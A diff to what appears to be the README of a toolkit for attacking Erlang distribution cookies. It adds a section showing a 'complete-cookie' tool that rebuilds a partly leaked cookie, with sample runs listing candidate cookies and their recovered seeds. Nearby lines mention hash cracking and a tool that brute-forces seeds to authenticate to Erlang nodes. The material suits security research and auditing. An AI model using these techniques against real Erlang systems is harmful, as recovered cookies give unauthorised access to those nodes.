@@ -263,6 +263,35 @@ sys	0m16.311s
 In this case you can always fall back to raw md5 cracking using `oclHashcat` or `john`. Or google.
 The hash above matches `password` as plaintext.
 
+### Completing an partly leaked cookie
+
+Imagine that a crash has given you only a part of the cookie. Due to its nature, missing parts can be completed ! For starter, let's begin with just a missing character, at the beginning:
+
+```
+$ time ./complete-cookie .ICIEBZGURYVBZWLJTFI
+IICIEBZGURYVBZWLJTFI (seed = 21832984186)
+
+real	0m2.027s
+user	0m15.774s
+sys	0m0.021s
+```
+
+Mission accomplished, though bruteforcing the 26 possible first character would have been much easier. But let's take a more complex example, only the last seven characters were dumped:
+
+```
+$ time ./complete-cookie .............ZWLJTFI
+QYUFBUCVATYSFZWLJTFI (seed = 21192402681)
+DZQLCMSUWKIIWZWLJTFI (seed = 21459172327)
+IICIEBZGURYVBZWLJTFI (seed = 21832984186)
+SPRNLDKPIEAKVZWLJTFI (seed = 22502081476)
+MKLNNWZUXYQCXZWLJTFI (seed = 22888304281)
+WSBSUZKCKLRRRZWLJTFI (seed = 23557401571)
+
+real	0m2.040s
+user	0m15.726s
+sys	0m0.028s
+```
+
 ### Bruteforcing Erlang cookie
 
 When you have found an open suitable port, you can use [bruteforce-erldp](bruteforce-erldp.c) to sweep a seed interval and perform network exchanges to authenticate.
